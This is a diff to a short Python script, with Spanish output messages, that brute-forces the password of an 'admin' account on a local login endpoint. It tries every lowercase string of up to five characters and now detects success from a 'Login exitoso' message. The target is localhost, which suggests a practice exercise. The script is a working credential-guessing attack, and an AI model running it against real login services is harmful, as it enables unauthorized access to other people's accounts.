@@ -5,12 +5,12 @@ import time
 
 URL = "http://127.0.0.1:8000/login"
 USERNAME = "admin"
-alphabet = "abcdefghijklmnopqrstuvwxyz"
+
+alphabet = string.ascii_lowercase
 max_length = 5
 
 intentos = 0
 inicio = time.time()
-
 
 with requests.Session() as session:
     for length in range(1, max_length + 1):
@@ -19,19 +19,20 @@ with requests.Session() as session:
             intentos += 1
 
             try:
-                
                 response = session.post(URL, json={
                     "username": USERNAME,
                     "password": password
                 })
 
-                if response.status_code == 200:
-                    print(f" Contraseña encontrada: {password}")
+                
+                if response.json()["message"] == "Login exitoso":
+                    print(f"Contraseña encontrada: {password}")
                     print(f"Intentos: {intentos}")
                     print(f"Tiempo: {time.time() - inicio:.2f} segundos")
                     exit()
+
             except Exception as e:
                 print(f"Error en el intento {intentos}: {e}")
-                time.sleep(1) 
+                time.sleep(1)
 
-print(" No se encontró la contraseña")
+print("No se encontró la contraseña")
